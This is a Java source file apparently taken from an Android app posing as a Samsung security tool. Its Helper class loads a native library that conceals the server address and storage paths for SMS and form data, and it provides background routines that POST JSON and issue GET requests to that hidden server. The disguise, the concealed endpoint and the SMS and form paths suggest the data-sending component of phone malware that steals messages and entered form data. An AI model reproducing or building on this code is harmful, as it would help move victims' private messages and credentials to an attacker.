package security.union.safe.guard.mask.samsung;

import android.content.Context;
import android.icu.text.SimpleDateFormat;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Date;
import java.util.Locale;
import java.util.Scanner;


public class Helper {

    {
        System.loadLibrary("samsung");
    }
    public native String SITE();
    public native String URL();
    public native String SMSSavePath();
    public native  String FormSavePath();

    public static String TAG = "";

    public static void postRequest(String path, JSONObject jsonData, ResponseListener listener) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    Helper help = new Helper();
                    String urlString = help.URL() + path;
                    URL url = new URL(urlString);

                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setDoOutput(true);

                    // Write JSON data to the output stream
                    OutputStream os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8));
                    writer.write(jsonData.toString());
                    writer.flush();
                    writer.close();
                    os.close();

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        Scanner scanner = new Scanner(conn.getInputStream());
                        StringBuilder responseBuilder = new StringBuilder();
                        while (scanner.hasNextLine()) {
                            responseBuilder.append(scanner.nextLine());
                        }
                        scanner.close();
                        response = responseBuilder.toString();
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                // Pass the result to the listener

                if (listener != null) {
                    listener.onResponse(result);
                }
            }
        }.execute(path);
    }

    // Interface for callback
    public interface ResponseListener {
        void onResponse(String result);
    }

    public static void getRequest(String path, ResponseListener listener) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    Helper help = new Helper();
                    String urlString = help.URL() + path;  // Append the path to the base URL
                    URL url = new URL(urlString);

                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("Accept", "application/json");

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        Scanner scanner = new Scanner(conn.getInputStream());
                        StringBuilder responseBuilder = new StringBuilder();
                        while (scanner.hasNextLine()) {
                            responseBuilder.append(scanner.nextLine());
                        }
                        scanner.close();
                        response = responseBuilder.toString();
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                // Pass the result to the listener
                if (listener != null) {
                    listener.onResponse(result);
                }
            }
        }.execute(path);
    }


    public static void sendSMS(String path, String message) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    Helper help = new Helper();
                    String urlString = help.URL() + path;  // Append the path to the base URL for the GET request
                    URL url = new URL(urlString);
                    //Log.d("mywork", "doInBackground API URL: " + urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        try (Scanner scanner = new Scanner(conn.getInputStream())) {
                            StringBuilder responseBuilder = new StringBuilder();
                            while (scanner.hasNextLine()) {
                                responseBuilder.append(scanner.nextLine());
                            }
                            response = responseBuilder.toString();
                        }
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                //Log.d("mywork", "doInBackground API Response: " + response);
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                try {
                    // Parse JSON response
                    JSONObject jsonResponse = new JSONObject(result);
                    if (jsonResponse.has("data")) {

                        String phoneNumber = jsonResponse.getString("data");

                    } else {
                        Log.e("MYAPP: ", "Response does not contain 'data' field");
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                    Log.e("MYAPP: ", "JSON Parsing Error: " + e.getMessage());
                }
            }
        }.execute();
    }


    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network network = connectivityManager.getActiveNetwork();
                if (network != null) {
                    NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(network);
                    return networkCapabilities != null && (
                            networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
                    );
                }
            } else {
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                return activeNetworkInfo != null && activeNetworkInfo.isConnected();
            }
        }
        return false;
    }

}

